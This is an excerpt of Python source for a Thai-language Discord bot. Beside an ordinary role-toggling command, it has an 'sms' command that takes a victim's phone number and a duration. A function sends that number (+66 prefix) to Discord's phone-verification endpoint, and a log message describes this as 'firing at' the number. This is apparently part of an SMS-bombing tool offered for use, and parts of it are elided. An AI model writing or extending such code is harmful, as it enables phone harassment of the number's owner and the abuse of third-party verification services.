...
async def role(ctx, user : discord.Member, *, role : discord.Role):
    if role.position > ctx.author.top_role.position:
        return await ctx.send('**:x: | กรุณาให้บทบาทบอทสู่งกว่าบทบาทที่จะให้**') 
    if role in user.roles:
        await user.remove_roles(role)
        embed = discord.Embed(description=f"ลบบทบบาท {role} จาก {user.mention}", color=0x00ff00)
        await ctx.send(embed=embed)
    else:
        await user.add_roles(role)
        embed = discord.Embed(description=f"เพิ่มบทบาท {role} ให้ {user.mention}", color=0xff0000)
        await ctx.send(embed=embed)


@bot.command("sms")
async def sms(ctx, no=None, jam:int=None):
    if ctx.channel.id != 1099690818501103687:
        return
    try:
        if (no == None or jam == None):
            response = discord.Embed(title="⚠️ Error",description="กรุณากรอกข้กรอกข้อมูลให้ครบ",color=0xe31010)
            await ctx.reply(embed=response)
        else:
            phone = no
            jam = jam
            embed = discord.Embed(title="✅ SUCCESS",description=f"เบอร์  📵     : ||{phone}|| \nสถานะ  :envelope_with_arrow:     : สุ่ม \nเป็นเวลา  :bar_chart:  : {jam} นาที ",color=0x45fc03)
            embed.set_thumbnail(url="https://media.tenor.com/o_akBgu1igoAAAAM/%E0%B8%AD%E0%B8%99%E0%B8%B4%E0%B9%80%E0%B8%A1%E0%B8%B0.gif")
            ...
            data = {
                "embeds": [
                    {
                        "title": "log-sms",
                        "description": f"User <@{ctx.author.id}> ยิงเบอร์ไปที่ {phone}",
                        "color": 0x00ff00,
                        "fields": [
                            {
                                "name": "เบอร์",
        ...
        response = discord.Embed(title="⚠️ Error",description="โปรดระบุข้อมูลที่จำเป็นทั้งหมด",color=0xe31010)
        await ctx.reply(embed=response)
...
def api72(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post(f"https://discord.com/api/v9/users/@me/phone",headers=header,json={"phone":"+66"+phone})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   | {r.status_code}")
